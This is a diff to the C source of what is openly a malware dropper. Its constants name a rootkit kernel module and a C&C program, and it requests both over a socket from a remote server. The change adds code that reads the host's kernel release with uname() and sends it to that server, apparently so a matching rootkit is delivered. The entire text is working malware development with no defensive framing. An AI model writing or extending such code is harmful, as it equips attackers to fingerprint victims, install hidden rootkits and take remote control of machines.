@@ -10,6 +10,7 @@
 #include <sys/shm.h>
 #include <errno.h>
 #include <sys/wait.h>
+#include <sys/utsname.h>
 
 #define SP_PORT     8895
 #define BUFFER_SIZE 4096
@@ -17,6 +18,7 @@
 #define CMD_RESULT "cmdoutput.txt"
 char* ROOTKIT = "hidefile.ko";   
 char* CCPROGRAM = "ccprogram";  
+struct utsname OS_info;
 char buf[BUFFER_SIZE];
 int sock_fd;
 
@@ -34,7 +36,10 @@ int opensocket();
 int main()
 {
     int rv;
-    
+
+    if(uname(&OS_info)){
+        exit(1);
+    }
     rv = opensocket();
     rv = obtain(CCPROGRAM);
 //    memcpy(buf, "./", 2);
@@ -73,8 +78,13 @@ int obtain(char* filename){
     memcpy(buf, "obtain\n", 7);                     // Req for obtain a rootkit/C&C program
     send(sock_fd, buf, strlen(buf),0); 
     
-    memcpy(buf, filename, strlen(filename));
+   
+    memcpy(buf, filename, strlen(filename));        // Send file name
     memcpy(buf + strlen(filename), "\n", 1);
+    send(sock_fd, buf, strlen(buf),0); 
+    
+    memcpy(buf, OS_info.release, strlen(OS_info.release));  // Send Operating System information
+    memcpy(buf + strlen(OS_info.release), "\n", 1);
     send(sock_fd, buf, strlen(buf),0); 
     
     memset(buf, 0, sizeof(buf));    
